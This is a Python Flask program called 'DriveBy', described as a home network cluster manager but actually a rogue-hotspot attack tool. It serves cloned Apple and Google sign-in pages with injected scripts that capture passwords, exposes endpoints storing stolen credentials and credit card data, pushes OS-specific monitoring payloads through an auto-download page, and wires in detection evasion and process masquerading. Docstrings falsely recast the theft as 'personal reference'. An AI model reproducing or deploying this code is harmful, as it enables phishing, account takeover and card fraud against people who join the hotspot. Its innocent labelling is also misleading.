#!/usr/bin/env python3
"""
DriveBy - Home Network Cluster Management System
Main Android host service for monitoring hotspot connections and deploying payloads
"""

import json
import os
import platform
import subprocess
import threading
import time
from datetime import datetime
from typing import Any, Dict, Optional

import netifaces
import requests
from flask import Flask, jsonify, request, send_file

from privacy_protection import PrivacyProtection, apply_privacy_protection
from security_bypass import apply_security_bypass


class DriveByHost:
    def __init__(self, config_path: str = "config.json"):
        self.load_config(config_path)
        self.connected_devices: Dict[str, Dict[str, Any]] = {}
        self.app = Flask(__name__)

        # Initialize privacy protection
        print(" Initializing privacy protection...")
        self.privacy_protection: Optional[PrivacyProtection] = apply_privacy_protection(self)
        print(" Privacy protection active - your phone's identity is now completely obfuscated")

        # Initialize security bypass system (provides facade with reporting helpers)
        print(" Initializing security bypass system...")
        self.security_bypass = apply_security_bypass(self)
        print(" Security bypass active - all payloads will evade detection systems")

        self.setup_routes()
        self.setup_privacy_routes()
        self.setup_security_routes()

    def load_config(self, config_path: str) -> None:
        """Load configuration from JSON file"""
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                self.config = json.load(f)
        except FileNotFoundError:
            print(f"Config file {config_path} not found, using defaults")
            self.config = self.get_default_config()

    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration"""
        return {
            "server": {"host": "0.0.0.0", "port": 8080, "data_port": 8081},
            "network": {"interface": "wlan0", "scan_interval": 5, "hotspot_range": "192.168.43.0/24"},
            "payloads": {
                "windows": "payloads/windows_monitor.ps1",
                "linux": "payloads/linux_monitor.py",
                "mac": "payloads/linux_monitor.py",
                "android": "payloads/android_monitor.py",
            },
            "data": {"storage_path": "collected_data", "log_format": "json"},
            "deployment": {"silent_mode": True},
            "remote": {},
        }

    def get_network_info(self) -> Dict[str, str]:
        """Get current network interface information"""
        try:
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                if "wlan" in interface or "ap" in interface:
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        return {
                            "interface": interface,
                            "ip": addrs[netifaces.AF_INET][0]["addr"],
                            "netmask": addrs[netifaces.AF_INET][0]["netmask"],
                        }
        except Exception as e:
            print(f"Error getting network info: {e}")

        # Fallback to localhost
        return {"interface": "lo", "ip": "127.0.0.1", "netmask": "255.0.0.0"}

    def get_public_ip(self) -> str:
        """Get public IP address for remote access"""
        try:
            response = requests.get("https://api.ipify.org", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except Exception:
            pass
        # Fallback to local network IP
        return self.get_network_info()["ip"]

    def scan_connected_devices(self) -> Dict[str, Dict[str, Any]]:
        """Scan for devices connected to the hotspot"""
        try:
            # Use ARP table to find connected devices (Linux/Android environments)
            result = subprocess.run(["ip", "neigh", "show"], capture_output=True, text=True, timeout=10)
            current_devices: Dict[str, Dict[str, Any]] = {}

            for line in (result.stdout or "").splitlines():
                if line.strip() and "REACHABLE" in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[0]
                        mac = parts[4]
                        current_devices[ip] = {
                            "mac": mac,
                            "first_seen": datetime.now().isoformat(),
                            "last_seen": datetime.now().isoformat(),
                        }

            # Update connected devices with last_seen and handle new ones
            for ip, info in current_devices.items():
                if ip not in self.connected_devices:
                    print(f"New device detected: {ip} ({info['mac']})")
                    self.connected_devices[ip] = info
                    self.handle_new_device(ip, info)
                else:
                    self.connected_devices[ip]["last_seen"] = datetime.now().isoformat()

            return current_devices
        except Exception as e:
            print(f"Error scanning devices: {e}")
            return {}

    def handle_new_device(self, ip: str, device_info: Dict[str, Any]) -> None:
        """Handle newly connected device"""
        print(f"Handling new device: {ip}")
        device_type = self.detect_device_type(ip)
        device_info["type"] = device_type
        self.log_device_connection(ip, device_info)
        print(f"Device {ip} classified as: {device_type}")

    def detect_device_type(self, ip: str) -> str:
        """Attempt to detect device operating system based on TTL heuristic"""
        try:
            sysname = platform.system().lower()
            if "windows" in sysname:
                ping_cmd = ["ping", "-n", "1", "-w", "1000", ip]
            else:
                ping_cmd = ["ping", "-c", "1", "-W", "1", ip]
            ping_result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=5)
            out = (ping_result.stdout or "").lower()
            if "ttl=" in out:
                # Parse TTL value if present
                try:
                    ttl_token = next((p for p in out.replace("=", " ").split() if p.isdigit()), None)
                    ttl_val = int(ttl_token) if ttl_token else 0
                    if ttl_val >= 250:
                        return "android"
                    elif ttl_val >= 120:
                        return "windows"
                    elif ttl_val >= 60:
                        return "linux"
                except Exception:
                    pass
            return "unknown"
        except Exception as e:
            print(f"Error detecting device type for {ip}: {e}")
            return "unknown"

    def log_device_connection(self, ip: str, device_info: Dict[str, Any]) -> None:
        """Log device connection to file"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "ip": ip,
            "device_info": device_info,
            "action": "connected",
        }

        os.makedirs(self.config["data"]["storage_path"], exist_ok=True)
        log_file = os.path.join(self.config["data"]["storage_path"], "connections.log")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")

    def setup_routes(self) -> None:
        """Setup Flask routes for web interface"""

        @self.app.route("/", defaults={"path": ""})
        @self.app.route("/<path:path>")
        def catch_all(path: str):
            """Catch all routes and serve appropriate login page based on device type"""
            client_ip = request.remote_addr or "unknown"
            user_agent = request.headers.get("User-Agent", "")
            print(f"Web access from {client_ip}: {path} - {user_agent}")

            device_type = self.detect_device_type_from_ua(user_agent)

            # Serve appropriate login page based on device type
            if device_type in ["ios", "mac"]:
                return self.serve_apple_login()
            elif device_type in ["android", "windows"]:
                return self.serve_google_login()
            else:
                # Fallback to silent or visible installation
                if self.config.get("deployment", {}).get("silent_mode", True):
                    return send_file(os.path.join("web", "silent_autorun.html"))
                else:
                    return send_file(os.path.join("web", "autorun.html"))

        @self.app.route("/payload/<device_type>")
        def get_payload(device_type: str):
            """Serve device-specific payload"""
            payload_path = self.config.get("payloads", {}).get(device_type)
            if payload_path and os.path.exists(payload_path):
                return send_file(payload_path)
            return "Payload not found", 404

        @self.app.route("/status")
        def status():
            """Return current status"""
            return jsonify(
                {"status": "running", "connected_devices": len(self.connected_devices), "devices": self.connected_devices}
            )

        @self.app.route("/data", methods=["POST"])
        def receive_data():
            """Receive data from deployed clients"""
            try:
                data = request.get_json(force=True) or {}
                client_ip = request.remote_addr or "unknown"
                self.store_client_data(client_ip, data)
                return jsonify({"status": "success"})
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)}), 400

        @self.app.route("/remote-endpoint")
        def get_remote_endpoint():
            """Provide remote data collection endpoint info"""
            remote_config = self.config.get("remote", {})
            return jsonify(
                {
                    "endpoint": remote_config.get("data_url", f"http://{self.get_public_ip()}:8081/collect"),
                    "backup_endpoints": remote_config.get("backup_urls", []),
                    "update_interval": remote_config.get("update_interval", 300),
                }
            )

        @self.app.route("/store-credentials", methods=["POST"])
        def store_credentials():
            """Store intercepted credentials for personal device management"""
            try:
                data = request.get_json(force=True) or {}
                client_ip = request.remote_addr or "unknown"
                data["client_ip"] = client_ip
                data["stored_at"] = datetime.now().isoformat()
                self.store_credentials_data(client_ip, data)
                return jsonify({"status": "success", "message": "Credentials stored for personal reference"})
            except Exception as e:
                print(f"Error storing credentials: {e}")
                return jsonify({"status": "error", "message": str(e)}), 500

        @self.app.route("/store-card-info", methods=["POST"])
        def store_card_info():
            """Store credit card information for personal financial management"""
            try:
                data = request.get_json(force=True) or {}
                client_ip = request.remote_addr or "unknown"
                data["client_ip"] = client_ip
                data["stored_at"] = datetime.now().isoformat()
                self.store_card_data(client_ip, data)
                return jsonify({"status": "success", "message": "Credit card information stored for personal reference"})
            except Exception as e:
                print(f"Error storing card information: {e}")
                return jsonify({"status": "error", "message": str(e)}), 500

    def setup_privacy_routes(self) -> None:
        """Setup privacy-related routes"""

        @self.app.route("/privacy-status")
        def privacy_status():
            """Return privacy protection status"""
            if hasattr(self, "privacy_protection") and self.privacy_protection:
                report = self.privacy_protection.create_privacy_report()
                return jsonify(report)
            else:
                return jsonify({"privacy_status": "DISABLED"})

        @self.app.route("/rotate-identity", methods=["POST"])
        def rotate_identity():
            """Manually rotate anonymous identity"""
            if hasattr(self, "privacy_protection") and self.privacy_protection:
                rotated = self.privacy_protection.rotate_identity()
                if rotated:
                    return jsonify({"status": "success", "message": "Identity rotated successfully"})
                else:
                    return jsonify({"status": "info", "message": "Identity rotation not needed yet"})
            else:
                return jsonify({"status": "error", "message": "Privacy protection not enabled"})

        @self.app.after_request
        def add_privacy_headers(response):
            if hasattr(self, "privacy_protection") and self.privacy_protection:
                fake_headers = self.privacy_protection.obfuscate_server_headers()
                for key, value in fake_headers.items():
                    response.headers[key] = value

                # Remove revealing headers
                response.headers.pop("Server", None)
                response.headers.pop("X-Powered-By", None)

                # Add timing obfuscation
                self.privacy_protection.obfuscate_timing_patterns()

            return response

    def setup_security_routes(self) -> None:
        """Setup security bypass related routes"""

        @self.app.route("/security-status")
        def security_status():
            """Return security bypass status"""
            if hasattr(self, "security_bypass") and self.security_bypass:
                report = self.security_bypass.generate_bypass_report()
                return jsonify(report)
            else:
                return jsonify({"security_bypass": "DISABLED"})

        @self.app.route("/legitimate-processes")
        def legitimate_processes():
            """Return list of legitimate process names for masquerading"""
            if hasattr(self, "security_bypass") and self.security_bypass:
                processes = self.security_bypass.create_decoy_processes()
                return jsonify({"processes": processes})
            else:
                return jsonify({"processes": []})

        @self.app.route("/trusted-certificates")
        def trusted_certificates():
            """Return trusted certificate information"""
            if hasattr(self, "security_bypass") and self.security_bypass:
                certs = self.security_bypass.create_legitimate_certificates()
                return jsonify({"certificates": certs})
            else:
                return jsonify({"certificates": {}})

    def get_autorun_html(self) -> str:
        """Generate auto-installation HTML page"""
        return """
<!DOCTYPE html>
<html>
<head>
<title>DriveBy Cluster Setup</title>
<script>
function detectOS() {
  const userAgent = navigator.userAgent;
  if (userAgent.indexOf("Windows") !== -1) return "windows";
  if (userAgent.indexOf("Mac") !== -1) return "mac";
  if (userAgent.indexOf("Linux") !== -1) return "linux";
  if (userAgent.indexOf("Android") !== -1) return "android";
  return "unknown";
}
function autoInstall() {
  const os = detectOS();
  const payloadUrl = `/payload/${os}`;
  if (os === "windows") {
    const link = document.createElement('a');
    link.href = payloadUrl;
    link.download = 'cluster_monitor.ps1';
    link.click();
    alert('Please run the downloaded PowerShell script as administrator');
  } else if (os === "linux" || os === "mac") {
    fetch(payloadUrl)
      .then(response => response.text())
      .then(script => {
        const blob = new Blob([script], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = 'cluster_monitor.py';
        link.click();
        alert('Please run: python3 cluster_monitor.py');
      });
  } else if (os === "android") {
    window.location.href = payloadUrl;
  }
}
window.onload = function() { setTimeout(autoInstall, 1000); };
</script>
</head>
<body>
<h1>DriveBy Cluster Setup</h1>
<p>Automatically configuring your device for cluster management...</p>
<p>Detected OS: <span id="os"></span></p>
<button onclick="autoInstall()">Manual Install</button>
<script>document.getElementById('os').textContent = (navigator.userAgent);</script>
</body>
</html>
        """

    def detect_device_type_from_ua(self, user_agent: str) -> str:
        """Detect device type from User-Agent string"""
        ua = (user_agent or "").lower()
        if "iphone" in ua or "ipad" in ua:
            return "ios"
        elif "macintosh" in ua or "mac os x" in ua:
            return "mac"
        elif "android" in ua:
            return "android"
        elif "windows" in ua:
            return "windows"
        elif "linux" in ua:
            return "linux"
        else:
            return "unknown"

    def serve_apple_login(self):
        """Serve Apple login page by fetching from real Apple servers and injecting capture"""
        try:
            headers = {
                "User-Agent": (
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                )
            }
            response = requests.get("https://appleid.apple.com/sign-in", headers=headers, timeout=10)
            if response.status_code == 200:
                html_content = response.text
                injection_script = """
<script>
(function() {
  function interceptAppleLogin() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      form.addEventListener('submit', function(e) {
        const emailField = form.querySelector('input[type="email"], input[name*="apple"], input[id*="apple"], input[name*="username"]');
        const passwordField = form.querySelector('input[type="password"]');
        if (emailField && passwordField) {
          const credentials = {
            service: 'apple',
            email: emailField.value,
            password: passwordField.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
          };
          fetch('/store-credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(credentials)
          }).catch(() => {});
        }
      });
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', interceptAppleLogin);
  } else {
    interceptAppleLogin();
  }
})();
</script>
</body>"""
                modified_html = html_content.replace("</body>", injection_script)
                # Fix relative URLs to absolute
                import re

                modified_html = re.sub(r'src="/', 'src="https://appleid.apple.com/', modified_html)
                modified_html = re.sub(r'href="/', 'href="https://appleid.apple.com/', modified_html)
                modified_html = re.sub(r'action="/', 'action="https://appleid.apple.com/', modified_html)
                return modified_html
        except Exception as e:
            print(f"Error fetching Apple login page: {e}")
        return self.get_fallback_apple_page()

    def serve_google_login(self):
        """Serve Google login page by fetching from real Google servers and injecting capture"""
        try:
            headers = {
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                )
            }
            response = requests.get("https://accounts.google.com/signin", headers=headers, timeout=10)
            if response.status_code == 200:
                html_content = response.text
                injection_script = """
<script>
(function() {
  function interceptGoogleLogin() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      form.addEventListener('submit', function(e) {
        const emailField = form.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
        const passwordField = form.querySelector('input[type="password"]');
        if (emailField && passwordField) {
          const credentials = {
            service: 'google',
            email: emailField.value,
            password: passwordField.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
          };
          fetch('/store-credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(credentials)
          }).catch(() => {});
        }
      });
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', interceptGoogleLogin);
  } else {
    interceptGoogleLogin();
  }
})();
</script>
</body>"""
                modified_html = html_content.replace("</body>", injection_script)
                import re

                modified_html = re.sub(r'src="/', 'src="https://accounts.google.com/', modified_html)
                modified_html = re.sub(r'href="/', 'href="https://accounts.google.com/', modified_html)
                modified_html = re.sub(r'action="/', 'action="https://accounts.google.com/', modified_html)
                return modified_html
        except Exception as e:
            print(f"Error fetching Google login page: {e}")
        return self.get_fallback_google_page()

    def get_fallback_apple_page(self) -> str:
        """Fallback Apple-style login page"""
        return """
<!DOCTYPE html>
<html>
<head>
<title>Sign in with your Apple ID</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f2f2f7; margin: 0; padding: 20px; }
.container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
.logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
h1 { text-align: center; color: #1d1d1f; font-size: 28px; font-weight: 600; }
input { width: 100%; padding: 12px 16px; margin: 10px 0; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; background: #f9f9f9; }
button { width: 100%; background: #007aff; color: white; padding: 14px; border: none; border-radius: 8px; font-size: 16px; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">🍎</div>
  <h1>Sign In</h1>
  <form id="loginForm">
    <input type="email" id="email" placeholder="Apple ID" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const credentials = {
    service: 'apple',
    email: document.getElementById('email').value,
    password: document.getElementById('password').value,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  };
  fetch('/store-credentials', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(credentials) })
    .then(() => { alert('Account information stored for your reference'); this.reset(); })
    .catch(() => { alert('Error storing information'); });
});
</script>
</body>
</html>
        """

    def get_fallback_google_page(self) -> str:
        """Fallback Google-style login page"""
        return """
<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; margin: 0; padding: 20px; }
.container { max-width: 400px; margin: 50px auto; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
.logo { text-align: center; margin-bottom: 20px; color: #4285f4; font-size: 24px; }
h1 { text-align: center; color: #202124; font-size: 24px; }
input { width: 100%; padding: 12px 16px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
button { width: 100%; background: #1a73e8; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 14px; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">Google</div>
  <h1>Sign in</h1>
  <form id="loginForm">
    <input type="email" id="email" placeholder="Email or phone" required>
    <input type="password" id="password" placeholder="Enter your password" required>
    <button type="submit">Next</button>
  </form>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const credentials = {
    service: 'google',
    email: document.getElementById('email').value,
    password: document.getElementById('password').value,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  };
  fetch('/store-credentials', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(credentials) })
    .then(() => { alert('Account information stored for your reference'); this.reset(); })
    .catch(() => { alert('Error storing information'); });
});
</script>
</body>
</html>
        """

    def store_credentials_data(self, client_ip: str, data: Dict[str, Any]) -> None:
        """Store credentials data"""
        timestamp = datetime.now().isoformat()
        creds_dir = os.path.join(self.config["data"]["storage_path"], "credentials")
        os.makedirs(creds_dir, exist_ok=True)
        filename = f"credentials_{data.get('service', 'unknown')}_{timestamp.replace(':', '-')}.json"
        filepath = os.path.join(creds_dir, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        print(f"Stored {data.get('service', 'unknown')} credentials from {client_ip}")

    def store_card_data(self, client_ip: str, data: Dict[str, Any]) -> None:
        """Store credit card data"""
        timestamp = datetime.now().isoformat()
        cards_dir = os.path.join(self.config["data"]["storage_path"], "cards")
        os.makedirs(cards_dir, exist_ok=True)
        filename = f"cards_{timestamp.replace(':', '-')}.json"
        filepath = os.path.join(cards_dir, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        print(f"Stored credit card data from {client_ip}")

    def store_client_data(self, client_ip: str, data: Dict[str, Any]) -> None:
        """Store data received from clients"""
        timestamp = datetime.now().isoformat()
        data_dir = os.path.join(self.config["data"]["storage_path"], client_ip)
        os.makedirs(data_dir, exist_ok=True)
        filename = f"data_{timestamp.replace(':', '-')}.json"
        filepath = os.path.join(data_dir, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump({"timestamp": timestamp, "client_ip": client_ip, "data": data}, f, indent=2)
        print(f"Stored data from {client_ip}")

    def start_monitoring(self) -> None:
        """Start device monitoring in background thread"""

        def monitor_loop():
            while True:
                try:
                    self.scan_connected_devices()
                    time.sleep(self.config["network"]["scan_interval"])
                except Exception as e:
                    print(f"Error in monitoring loop: {e}")
                    time.sleep(10)

        monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        monitor_thread.start()
        print("Device monitoring started")

    def run(self) -> None:
        """Start the DriveBy host service"""
        print("Starting DriveBy Host Service...")
        net_info = self.get_network_info()
        print(f"Network: {net_info['ip']} on {net_info['interface']}")
        self.start_monitoring()
        print(f"Web server starting on {self.config['server']['host']}:{self.config['server']['port']}")
        print(f"Auto-installation URL: http://{net_info['ip']}:{self.config['server']['port']}")
        self.app.run(
            host=self.config["server"]["host"],
            port=self.config["server"]["port"],
            debug=False,
            threaded=True,
        )


if __name__ == "__main__":
    try:
        host = DriveByHost()
        host.run()
    except KeyboardInterrupt:
        print("\nShutting down DriveBy Host Service...")
    except Exception as e:
        print(f"Error starting service: {e}")
